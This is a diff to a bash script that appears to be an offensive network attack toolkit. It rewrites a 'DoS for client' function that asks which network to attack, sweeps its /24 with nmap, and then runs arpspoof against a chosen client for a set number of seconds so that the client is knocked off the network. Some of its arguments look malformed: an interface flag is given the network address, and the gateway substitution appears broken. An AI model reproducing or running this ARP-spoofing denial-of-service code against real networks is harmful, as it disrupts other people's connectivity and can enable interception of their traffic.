@@ -464,13 +464,20 @@ modeagain () {
 }
 
 dosforclient () {
-	tput civis; clear; echo -e "\n${greenColour}[*]$grayColour Starting DoS for client..."
+	tput civis; clear; echo -e "\n${greenColour}[*]$grayColour Starting DoS for client... Wait a moment"
 	reconnect
-	echo -ne "${yellowColour}[?]$grayColour Network you want to attack?: " && read redattackdos
-	sleep 2
-	echo -ne "\n${purpleColour}[?]$grayColour Client you want to disconnect: " && read clientattackdos
+	tput cnorm; echo -ne "${yellowColour}[?]$grayColour Network you want to attack?: " && read redattackdos
+	sleep 2; tput civis
+	xterm -hold -e "sudo nmap -sP -Pn ${redattackdos}/24 | grep '(' | sed 's/^.*for //' | sed 's/Nmap.*//' | sed '1,2d'" &
+	nmapscan_PID=$!
+	tput cnorm; echo -ne "\n${purpleColour}[?]$grayColour Client you want to disconnect: " && read clientattackdos
+	kill -9 $nmapscan_PID; wait $nmapscan_PID 2>/dev/null
+	echo -ne "${greenColour}[?]$grayColour How long do you want the attack to last (seconds)?: " && read seg2
+	tput civis
 	ipnew=$(echo $clientattackdos | sed 's/\([0-9]\x\)$/1/g')
-	xterm -hold -e "arpspoof -i "$redattackdos" -t "$redattackdos" "$ipnew"" &
+	xterm -hold -e "sudo arpspoof -i "$redattackdos" -t "$clientattackdos" "$ipnew"" &
+	arpspoof_PID=$!
+	sleep $seg2; kill -9 $arpspoof_PID; wait $arpspoof_PID 2>/dev/null
 	modeagain
 }
 
